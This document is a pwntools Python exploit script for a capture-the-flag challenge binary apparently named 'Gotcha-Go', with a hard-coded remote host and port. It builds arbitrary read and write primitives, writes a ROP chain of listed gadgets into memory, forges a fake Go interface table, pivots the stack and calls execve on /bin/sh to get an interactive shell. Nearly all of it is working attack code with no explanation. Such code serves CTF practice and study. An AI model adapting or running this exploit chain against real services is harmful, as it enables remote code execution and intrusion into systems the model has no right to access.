#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ctf'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '35.200.115.59', 33337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x000000000046d860
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec ctf 
# [*] '/home/halcyon/SharedFolder/ierae-ctf/Gotcha-Go/ctf'
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def arb_read(addr):
    global io 
    # edit
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(0x3e).encode())
    io.sendline(p64(addr))
    # info
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(0x1c5).encode())

def arb_write(addr, data):
    global io
    # edit
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(0x3e).encode())
    io.sendline(p64(addr-0x8))
    sleep(2) # remote issue
    # edit
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(0x1c5).encode())
    io.sendline(data)
    sleep(2) # remote issue

def exploit():
    global io
    io = initialize()

    # structure at 0x5669c0 
    MyList = 0x4e51a8
    MyList_list = 0x56bfc0

    rsp_control_2 = 0x0000000000443732 # : pop rsp ; add rsp, 0x120 ; pop rbp ; ret
    rsp_control_1 = 0x000000000046d860 # : mov rsp, rbx ; pop rbp ; ret
    pop_rbx = 0x00000000004083e1 # : pop rbx ; ret
    mov_rsi_rax = 0x000000000040f88f # : mov rsi, rax ; ret
    pop_rax = 0x0000000000408744 # : pop rax ; ret
    pop_rdi = 0x0000000000473fc6 # : pop rdi ; setne al ; ret
    mov_rdx_rbx_call_rax = 0x00000000004562ae # : mov rdx, rbx ; call rax
    syscall = 0x0000000000412e4a # : syscall
    ret =  0x00000000004000d1 # : ret

    arb_write(0x561008, flat([
        pop_rax,
        pop_rax,
        pop_rbx,
        0x0,
        mov_rdx_rbx_call_rax,
        ret,
    ]))
    arb_write(0x561008+0x30, flat([
        pop_rdi,
        0x561060,
        pop_rax,
        0x3b,
        syscall,
        u64(b'/bin/sh\x00'),
    ]))
    arb_write(MyList_list, flat([0x561000]))

    fake_interface = flat([
        0x4ac120,
        0x4a3ba2dc,
        0x111,    # (main.(*MyList).edit)
        0x222,    # (main.(*MyList).info)
        rsp_control_1,    # (main.(*MyList).init)
    ])
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(-0xac0))
    io.sendline(fake_interface)
    sleep(2) # remote issue

    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', b'0')
    io.sendline(flat([
        rsp_control_2,
        0x561000-0x120,
    ]))
    sleep(2) # remote issue

    io.interactive()
    
if __name__ == '__main__':
    exploit()
